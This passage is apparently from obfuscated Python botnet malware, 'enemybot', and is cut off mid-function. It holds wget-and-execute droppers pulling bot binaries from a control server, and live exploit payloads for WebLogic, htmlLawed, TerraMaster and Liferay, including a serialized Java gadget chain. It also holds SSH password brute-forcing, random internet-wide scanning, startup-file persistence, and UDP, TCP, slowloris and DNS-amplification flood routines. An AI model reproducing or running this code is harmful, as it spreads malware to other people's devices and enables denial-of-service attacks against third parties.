        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1"]
        for _ in range(multiprocessing.cpu_count() * 8):
            try:
                threading.Thread(target=self.uPCvdcENovio).start()
            except:
                pass
        self.QencfIfkM()
    def weaBoNkFyH(self, url):
        KdkzshEddjqa = urllib.request.urlopen(url+wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x53\x65\x97\x66\xd4\xf1\xd1\x03\x00\x06\x7a\x01\x5d')), context=self.ctx)
        if KdkzshEddjqa.getcode() == 200:
            return 1
        else:
            return 0
    def infect(ip, port=23, username="", password=""):
        global running
        global echo
        global tftp
        global wget
        global logins
        global wizard_made
        global server
        if ip in wizard_made:
            return
        infectedkey = "PERROR"

        if str(port)==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x2b\x4d\x0f\x04\x00\x02\x81\x01\x2e')):
            url = wzihKxgDoV(zlib.decompress(b'\x78\x9c\xd3\x54\x17\x93\x64\xac\xe7\xc9\x07\x00\x05\x6a\x01\x7b'))+ip+":"+str(port)
        else:
            url = wzihKxgDoV(zlib.decompress(b'\x78\x9c\xd3\x54\x17\x93\xf4\xc8\xe2\x01\x00\x04\x9a\x01\x3e'))+ip+":"+str(port)
        
        global cmd_dlexe, passwd
        cmd_dlexe = commandx86 = urllib.parse.quote("wget http://%s/enemybotx86 -O enemy;chmod 0755 enemybotx86;./enemybotx86" % server)
        cmd_dlexe = cmd_dlexearm64 = command = urllib.parse.quote("wget http://%s/enemybotarm64;chmod 0755 enemybotarm64;./enemybotarm64;wget http://%s/enemybot%s;chmod 0755 enemybot%s;./enemybot%s;logout" % server, server, "arm64", "arm64", "arm64")
        cmd_dlexe = cmd_dlexearm = command = urllib.parse.quote("wget http://%s/enemybotarm;chmod 0755 enemybotarm;./enemybotarm;rm -rf enemybotarm;wget http://%s/enemybot%s;chmod 0755 enemybot%s;./enemybot%s;logout" % server, server, "arm64", "arm64", "arm64")
        
        request = requests.session()
        headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}
        print("[+] Sending GET Request for weblogic ....")
        try:
            GET_Request = request.get(target + "/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('" + command + "');\");", verify=False, headers=headers)
            print("[$] Exploit successful! Hooray..")
        except:
            pass
        print("[+] Sending htmlLawed 1.2.5 exploit ....")
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(6)
            s.connect((target, 443))
            s=ssl.wrap_socket(s)
            s.send("POST / HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: curl/8.10.1\r\nAccept: */*\r\nCookie: sid=foo\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nsid=foo&hhook=exec&text=" + command)
            s.recv(1024)
            s.close()
            print("[+] Successful sending! Lets hope it worx!")
        except:
            pass
        print("[-] Exploits have failed !! now SSH bruting....")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)
            s.connect((target, 22))
            s=ssl.wrap_socket(s)
            fgh=open(sshcommand, "a+")
            fgh.write(target + "\r\n")
            fgh.close()
            s.close()
        except:
            return
        try:
            for result in passwd:
                try:
                    result = result.split(" ")
                    ssh.connect(target, result[0], password=result[1])
                    stdin, stdout, stderr = ssh.exec_command('system')
                    stdin, stdout, stderr = ssh.exec_command('enable')
                    stdin, stdout, stderr = ssh.exec_command('push')
                    stdin, stdout, stderr = ssh.exec_command('root')
                    stdin, stdout, stderr = ssh.exec_command('admin')
                    stdin, stdout, stderr = ssh.exec_command('telnetd')
                    stdin, stdout, stderr = ssh.exec_command('cat | sh')
                    stdin, stdout, stderr = ssh.exec_command(cmd_dlexe)
                    x = stdout.readlines()
                    print(x)
                    for line in x:
                        print(line)
                except:
                    pass
                ssh.close()
        except:
            pass
        try:
            headers=requests.get(url).headers
            servertype=requests.get(url).headers['Server']
            if servertype == "TNAS":
                s = requests.Session()
                s.headers.update({"user-device":"TNAS", "user-agent":"TNAS"})
                r=s.post(f"{target}/module/api.php?mobile/wapNasIPS")
                try:
                    j = r.json()
                    PWD = j["data"]["PWD"]
                    MAC_ADDRESS = j["data"]["ADDR"]
                except KeyError:
                    raise(Exception)
                TIMESTAMP = str(int(time.time()))
                s.headers.update({"signature": tos_encrypt_str(TIMESTAMP), "timestamp": TIMESTAMP})
                s.headers.update({"authorization": PWD})
                #RCEs
                terramasterRCEs=[f"{target}/tos/index.php?app/del&id=0&name=;{cmd_dlexearm64};xx%23",
                  f"{target}/tos/index.php?app/hand_app&name=;{cmd_dlexearm64};xx.tpk", #BLIND
                  f"{target}/tos/index.php?app/app_start_stop&id=ups&start=0&name=donotcare.*.oexe;{cmd_dlexearm64};xx"] #BLIND                
                for urltohack in terramasterRCEs:
                    r = s.get(RCEs[args.rce])
                    content = str(r.content, "utf-8")
                    if "<!--user login-->" not in content: 
                        pass # print(content)
            if "Liferay-Portal" in headers:
                headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*"}
                response = session.get(""+target+"/api/jsonws/invoke", headers=headers,verify=False)
                if "Unable to deserialize object" in response.text:
                    paramsPost = {"p_auth":"AdsXeCqz","tableId%3d1":"","formDate":"1526638413000","columnId":"123","defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource":"{\"userOverridesAsString\":\"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878;\"}","name":"A","cmd":"{\"/expandocolumn/update-column\":{}}","type":"1"}
                    headers2 = {"Connection":"close","cmd2":cmd_dlexe,"Content-Type":"application/x-www-form-urlencoded"}
                    response2 = session.post(""+target+"/api/jsonws/invoke", data=paramsPost, headers=headers2,verify=False)
        except:
            pass
    def amXTwfownKKU(self):
        RxmNLSxUAqcC = [10,127,169,172,192,233,234]
        SRUgghcbCAx = random.randrange(1,256)
        while SRUgghcbCAx in RxmNLSxUAqcC:
            SRUgghcbCAx = random.randrange(1,256)
        ip = ".".join([str(SRUgghcbCAx),str(random.randrange(1,256)),
        str(random.randrange(1,256)),str(random.randrange(1,256))])
        return ip
    def uPCvdcENovio(self):
        while True:
            if EahdvJPb==0:
                time.sleep(1)
                continue
            PoKndWOJaeC = self.amXTwfownKKU()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((PoKndWOJaeC, 80))
                s.close()
                self.exploit(PoKndWOJaeC, 80)
            except Exception as e:
                pass
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((PoKndWOJaeC, 8080))
                s.close()
                self.exploit(PoKndWOJaeC, 8080)
            except Exception as e:
                pass
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((PoKndWOJaeC, 8081))
                s.close()
                self.exploit(PoKndWOJaeC, 8081)
            except Exception as e:
                pass
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((PoKndWOJaeC, 8181))
                s.close()
                self.exploit(PoKndWOJaeC, 8181)
            except Exception as e:
                pass
    def vAXCLXTSQ(self):
        try:
            GRLMhCcohx=open(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x33\x13\xe3\x8a\x35\x77\x33\x96\xe1\x36\xf4\x64\x8c\xd6\x37\x05\x00\x1c\x78\x03\x33')), "w")
            GRLMhCcohx.write(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xd3\x37\xe2\xe7\x61\x54\x08\x34\x13\x13\x4d\x0f\xf3\x61\xcd\x4f\xf2\x89\xa8\xd0\x76\xd2\x15\x13\x51\x12\x15\x09\x34\x2e\x0e\x76\x77\xca\x16\xce\x73\xca\x05\x00\x98\x4e\x08\xc8')))
            GRLMhCcohx.close()
            rc=open(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x33\x13\xe3\x8a\x35\x77\xc8\x93\xe7\x50\x61\xe3\x03\x00\x14\x13\x02\x66')),"rb")
            data=rc.read()
            rc.close()
            if wzihKxgDoV(zlib.decompress(b'\x78\x9c\x53\xb6\xe1\x95\x8d\x31\x8d\x02\x00\x04\xf1\x01\x75')) not in data:
                with open(chobJpTOevFk, "rb") as TUySGnRCua, open(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x33\x13\xe3\x8a\x55\xf7\xd1\x67\xf7\x34\x97\x03\x00\x10\xeb\x02\x69')), wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\x33\x04\x00\x00\x9f\x00\x68'))) as GEiiXcfOQ:
                    while True:
                        qDqeUyichDN = TUySGnRCua.read(1024*1024)
                        if not qDqeUyichDN:
                            break
                        GEiiXcfOQ.write(qDqeUyichDN)
                os.chmod(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x33\x13\xe3\x8a\x55\xf7\xd1\x67\xf7\x34\x97\x03\x00\x10\xeb\x02\x69')), 777)
                rc=open(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x33\x13\xe3\x8a\x35\x77\xc8\x93\xe7\x50\x61\xe3\x03\x00\x14\x13\x02\x66')),wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\x33\x04\x00\x00\x9f\x00\x68')))
                if wzihKxgDoV(zlib.decompress(b'\x78\x9c\x53\xd1\xe6\x96\x05\x00\x01\x48\x00\x78')) in data:
                    rc.write(data.replace(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x53\xd1\xe6\x96\x05\x00\x01\x48\x00\x78')), wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x33\x13\xe3\x8a\x55\xf7\xd1\x67\xf7\x34\x97\xcb\x08\xb4\xb4\x12\x03\x00\x21\x79\x03\xab'))))
                else:
                    rc.write(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xf3\xae\x61\x97\x15\xcc\x72\xd4\x97\x11\xce\x14\x97\x06\x00\x14\x41\x02\xa1')))
                rc.close()
        except:
            pass
    def nGdiRilqMfv(self,lpNZAMMils,deeDDamLKiG,FboGJpKFouca):
        if str(deeDDamLKiG).startswith(b"0"):
            iomHuOVzJBf=os.urandom(65500)
        else:
            iomHuOVzJBf="\xff"*65500
        oxioaScYBcGq=time.time()+FboGJpKFouca
        while oxioaScYBcGq>time.time():
            if self.AELmEnMe == 1:
                break
            try:
                boMhMkbL=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                if deeDDamLKiG==0:
                    boMhMkbL.sendto(iomHuOVzJBf,(lpNZAMMils, random.randrange(0,65535)))
                else:
                    boMhMkbL.sendto(iomHuOVzJBf,(lpNZAMMils, deeDDamLKiG))
                self.gLsaWmlh+=1
            except:
                pass
        self.XUbvPqib=self.gLsaWmlh*65535//1048576
        self.mKxjSTWt=self.XUbvPqib//int(FdAoOldyPg[6])
        self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x75\x77\x4f\x54\x66\xe6\x92\x54\x08\x37\x0e\x16\x51\xe2\x14\x93\x4a\x64\x60\x67\x67\x4b\x65\x33\x0e\xd6\x62\xf5\x76\x12\x34\x2a\xd6\xd7\x8e\x35\xd3\x04\x00\xec\x22\x09\x56')) % (self.lAyMzJrw,self.gLsaWmlh,self.XUbvPqib,self.mKxjSTWt))
        self.gLsaWmlh=0
    def koONMfazohB(self,wLoxZDVqdKqL,deeDDamLKiG,FboGJpKFouca):
        oxioaScYBcGq=time.time()+FboGJpKFouca
        while oxioaScYBcGq>time.time():
            if self.AELmEnMe == 1:
                return
            try:
                boMhMkbL=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                boMhMkbL.connect((wLoxZDVqdKqL, deeDDamLKiG))
                self.gLsaWmlh+=1
            except:
                pass
        self.gLsaWmlh=0
    def pXoNCaVoWOF(self,wLoxZDVqdKqL,deeDDamLKiG,FboGJpKFouca):
        oxioaScYBcGq=time.time()+FboGJpKFouca
        while oxioaScYBcGq>time.time():
            if self.AELmEnMe == 1:
                return
            try:
                boMhMkbL=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                boMhMkbL.connect((wLoxZDVqdKqL, deeDDamLKiG))
                boMhMkbL.send(os.urandom(ramom.randint(1024, 65535)))
                boMhMkbL.close()
                self.gLsaWmlh+=1
            except:
                pass
        self.gLsaWmlh=0
    def vJcKcoxAYdh(self,AFZoxkgkAdF, eICZkzCda, hfZZCascPDn, FboGJpKFouca):
        oxioaScYBcGq=time.time()+FboGJpKFouca
        self.gLsaWmlh = 0
        fds = []
        for PFfNeLWh in range(0, int(hfZZCascPDn)):
            fds.append(b"")
        while 1:
            if self.AELmEnMe == 1:
                break
            for PFfNeLWh in range(0, int(hfZZCascPDn)):
                if self.AELmEnMe == 1:
                    break
                fds[PFfNeLWh] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    fds[PFfNeLWh].connect((AFZoxkgkAdF, int(eICZkzCda)))
                except:
                    pass
            hGGAgAhcTw = "GET / HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n" % (AFZoxkgkAdF, eICZkzCda, random.choice(self.GbASkEbE))
            for oScShULXy in hGGAgAhcTw:
                if self.AELmEnMe == 1:
                    break
                for fd in fds:
                    try:
                        fd.send(oScShULXy)
                        self.gLsaWmlh+=1
                    except:
                        try:
                            fd.connect((AFZoxkgkAdF, int(eICZkzCda)))
                        except:
                            pass
                if oxioaScYBcGq<time.time():
                    for fd in fds:
                        try:
                            fd.close()
                        except:
                            pass
                    return
                time.sleep(1)
                self.gLsaWmlh = 0
        self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\xd5\x0f\x55\x35\x73\xf2\x61\x4c\x75\xd0\x97\xe5\x54\x62\x11\x8b\xd5\xb3\x15\x74\xaf\x00\x00\x76\x60\x07\x00')) % (self.lAyMzJrw,self.gLsaWmlh))
        self.gLsaWmlh=0
    def XYzfOacCQsxf(self,cWzbdShovd):
        try:
            req = urllib.request.Request(cWzbdShovd)
            req.add_header(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x51\x60\x97\x8e\x67\x71\x51\x95\x15\x06\x00\x07\x01\x01\x53')), random.choice(self.GbASkEbE))
            return urllib.request.urlopen(req).read()
        except:
            return ""
    def xykGjfUc(self,url,wcoiSPdnz,FboGJpKFouca):
        if wcoiSPdnz==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\x55\x14\xe7\x01\x00\x01\x75\x00\x7a')):
            oxioaScYBcGq=time.time()+FboGJpKFouca
            VSFcqvoviPG=zlib.decompress(b"\x78\x9c\xb3\x8d\x56\x52\x8f\xd5\xd0\x8b\x8e\x03\x52\xda\x9a\x20\x0e\x00\x28\xec\x04\x49")
            while oxioaScYBcGq>time.time():
                if self.AELmEnMe == 1:
                    break
                for IioCggTGIDx in re.findall(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xd3\x54\x64\xe7\x07\x00\x01\x28\x00\x61'))+VSFcqvoviPG,self.XYzfOacCQsxf(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.XYzfOacCQsxf(IioCggTGIDx)
                for IioCggTGIDx in re.findall(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\x52\x64\x04\x00\x00\xdc\x00\x55'))+VSFcqvoviPG,self.XYzfOacCQsxf(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.XYzfOacCQsxf(IioCggTGIDx)
        else:
            oxioaScYBcGq=time.time()+FboGJpKFouca
            while oxioaScYBcGq>time.time():
                if self.AELmEnMe == 1:
                    break
                self.XYzfOacCQsxf(url)
    def YWoQRehCLma(self,KoWJCgbazSbi,deeDDamLKiG,MuwisdsL,lmXTvmxM):
        self.scanThreads += 1
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((KoWJCgbazSbi,int(deeDDamLKiG)))
            s.close()
            if MuwisdsL == wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\x55\x14\xe7\x01\x00\x01\x75\x00\x7a')) or MuwisdsL == wzihKxgDoV(zlib.decompress(b'\x78\x9c\xb3\x30\x13\x04\x00\x01\x28\x00\x80')) or MuwisdsL == "1":
                self.exploit(KoWJCgbazSbi,int(deeDDamLKiG))
            self.exploitsconnecttats[lmXTvmxM][1] += 1
        except Exception as e:
            pass
        self.exploitstats[lmXTvmxM][0] += 1
        self.scanThreads -= 1
    def mvCyxlNc(self,lmXTvmxM,deeDDamLKiG,MuwisdsL):
        (ZvNiIduv, yoohXScJo) = lmXTvmxM.split('/')
        OdYDaaQVdL = ZvNiIduv.split('.')
        hBgOVhGzRaJW = int(yoohXScJo)
        eHouaESie = [0, 0, 0, 0]
        for i in range(hBgOVhGzRaJW):
            eHouaESie[i/8] = eHouaESie[i/8] + (1 << (7 - i % 8))
        cEXybmsZfsGA = []
        for i in range(4):
            cEXybmsZfsGA.append(int(OdYDaaQVdL[i]) & eHouaESie[i])
        GbyhmXdyXvK = list(cEXybmsZfsGA)
        BgXLsRho = 32 - hBgOVhGzRaJW
        for i in range(BgXLsRho):
            GbyhmXdyXvK[3 - i/8] = GbyhmXdyXvK[3 - i/8] + (1 << (i % 8))
        BWpcTPEf = ".".join(map(str, eHouaESie))
        ziDICaxPu = ".".join(map(str, cEXybmsZfsGA))
        OVuXRFkCUGZd = ".".join(map(str, GbyhmXdyXvK))
        ToiyKaRIsdGZ = struct.uneiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\x97\x02\x00\x01\x1a\x00\x9a')), socket.inet_aton(b".".join(map(str, cEXybmsZfsGA))))[0]
        iYQFiIoZ = struct.uneiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\x97\x02\x00\x01\x1a\x00\x9a')), socket.inet_aton(b".".join(map(str, GbyhmXdyXvK))))[0]
        MuwisdsL = MuwisdsL.lower()
        if MuwisdsL == wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\x55\x14\xe7\x01\x00\x01\x75\x00\x7a')) or MuwisdsL == wzihKxgDoV(zlib.decompress(b'\x78\x9c\xb3\x30\x13\x04\x00\x01\x28\x00\x80')) or MuwisdsL == "1":
            self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\xf7\x31\xb4\xe7\x65\x60\x4b\x0d\x50\x16\xe2\xd4\xe4\xe3\x09\x4e\x2c\x13\xf4\x94\xd5\x66\x36\x90\x11\x35\x76\x77\x77\xf7\x06\x00\xb9\xee\x08\x73')) % (self.lAyMzJrw,wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x51\x70\x72\x09\x4a\x08\x00\x00\x07\xe3\x02\x0d')) % (ziDICaxPu, OVuXRFkCUGZd),deeDDamLKiG))
        else:
            self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x0c\x57\xb0\xe5\x61\x90\x51\x62\x4e\x65\x70\xd7\xe0\x74\x72\xd1\x53\x14\xf3\x0c\x37\xd3\x04\x00\x7a\xd1\x06\xbd')) % (self.lAyMzJrw,wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x51\x70\x72\x09\x4a\x08\x00\x00\x07\xe3\x02\x0d')) % (ziDICaxPu, OVuXRFkCUGZd),deeDDamLKiG))
        self.exploitstats[lmXTvmxM] = [0,0]
        for i in range(ToiyKaRIsdGZ, iYQFiIoZ):
            ozccQVaa = socket.inet_ntoa(struct.eiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\x97\x02\x00\x01\x1a\x00\x9a')), i))
            try:
                if self.AELmEnMe == 1 or EahdvJPb == 0:
                    return
                while self.scanThreads >= (multiprocessing.cpu_count() * 8):
                    time.sleep(0.1)
                threading.Thread(target=self.YWoQRehCLma, args=(ozccQVaa,deeDDamLKiG,MuwisdsL,lmXTvmxM,)).start()
            except:
                pass
        self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x89\xd5\xb7\x12\x64\x14\x57\x64\x36\x16\x60\xd3\xe4\xe4\x8e\x52\x2b\x16\xe0\x90\x51\x72\x03\xca\xf9\x02\x00\x90\x16\x07\x27')) % (self.lAyMzJrw,lmXTvmxM))
    def ddevkYedee(self, ccCwzPJuX, LqDoeAaf, zZfuQaLo, alcmiahWsxkL):
        self.ccCwzPJuX = ccCwzPJuX
        self.LqDoeAaf = LqDoeAaf
        self.alcmiahWsxkLnd = time.time()+alcmiahWsxkL
        self.zZfuQaLo = zZfuQaLo
        for i in range(self.LqDoeAaf):
            t = threading.Thread(target=self.jZeYOJLd)
            t.start()
    def aMHPyhNd(self, sock, biVijZHPQ, bJHNVcZc, BdcFjdBoZic):
        udp = pqQjdZVHTiTP(random.randint(1, 65535), AaKozzFxDU[bJHNVcZc], BdcFjdBoZic).wyxCFILoPV(self.ccCwzPJuX, biVijZHPQ)
        ip = KVZywAHcYcok(self.ccCwzPJuX, biVijZHPQ, udp, bJHNVcZc=socket.IPPROTO_UDP).wyxCFILoPV()
        sock.sendto(ip+udp+BdcFjdBoZic, (biVijZHPQ, AaKozzFxDU[bJHNVcZc]))
    def __GetuYRhFwkp(self, QVPsPdcha):
        hGdEuPhiEdAA = QVPsPdcha.split('.')
        uYRhFwkp = ''
        for yuhadHOh in hGdEuPhiEdAA:
            if len(yuhadHOh):
                uYRhFwkp += eiHQQUmXufv('B', len(yuhadHOh)) + yuhadHOh
        return uYRhFwkp
    def YphhpXFPZAA(self, QVPsPdcha):
        uYRhFwkp = self.__GetuYRhFwkp(QVPsPdcha)
        return CocMZFBnHq["dns"].format(eiHQQUmXufv('H', random.randint(0, 65535)), uYRhFwkp)
    def jZeYOJLd(self):
        global bJHNVcZc
        global uTnUajaLEKlv
        global BsxFGPRogEX
        cvmhhxhhV = jmaoaichDJ
        for bJHNVcZc in cvmhhxhhV:
            f = open(cvmhhxhhV[bJHNVcZc][TsHDsaOXY], 'r')
            cvmhhxhhV[bJHNVcZc].append(f)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        i = 0
        while 1:
            try:
                if time.time()>=self.alcmiahWsxkLnd or self.AELmEnMe == 1:
                    break
                biVijZHPQ = cvmhhxhhV[bJHNVcZc][yELscaVhUe].readline().strip()
                if biVijZHPQ:
                    if bJHNVcZc=="dns":
                        if biVijZHPQ not in ZOzCsxfk[bJHNVcZc]:
